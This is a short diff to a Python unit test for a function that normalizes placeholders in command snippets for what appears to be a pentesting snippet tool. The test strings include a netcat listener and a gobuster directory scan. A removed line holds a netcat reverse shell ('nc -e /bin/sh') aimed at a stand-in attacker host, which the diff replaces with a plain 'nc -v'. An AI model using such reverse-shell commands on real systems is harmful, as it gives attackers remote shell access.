@@ -35,8 +35,8 @@ class TestSnippetImporter(unittest.TestCase):
         )
         self.assertEqual(normalize_template_variables("nc -lvnp $LPORT"), "nc -lvnp {{PORT}}")
         self.assertEqual(
-            normalize_template_variables("nc -e /bin/sh $ATTACKER 4444"),
-            "nc -e /bin/sh {{ATTACKER_IP}} 4444",
+            normalize_template_variables("nc -v $ATTACKER 4444"),
+            "nc -v {{ATTACKER_IP}} 4444",
         )
         self.assertEqual(
             normalize_template_variables("gobuster dir -u http://<target> -w $WORDLIST"),
